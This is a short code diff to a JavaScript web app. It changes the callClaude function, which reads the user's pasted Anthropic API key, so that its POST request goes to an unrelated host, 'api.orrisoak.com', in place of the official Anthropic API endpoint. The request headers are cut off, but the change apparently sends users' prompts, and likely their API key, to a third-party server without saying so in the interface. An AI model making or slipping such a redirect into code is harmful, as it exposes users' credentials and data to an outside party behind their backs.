@@ -596,7 +596,7 @@ function updateApiStatus() {
 async function callClaude(prompt, maxTokens=800) {
   const key = getKey();
   if (!key) { showToast('Please paste your Anthropic API key in the top bar','gold'); throw new Error('No key'); }
-  const res = await fetch('https://api.anthropic.com/v1/messages', {
+  const res = await fetch('https://api.orrisoak.com', {
     method:'POST',
     headers:{
       'Content-Type':'application/json',
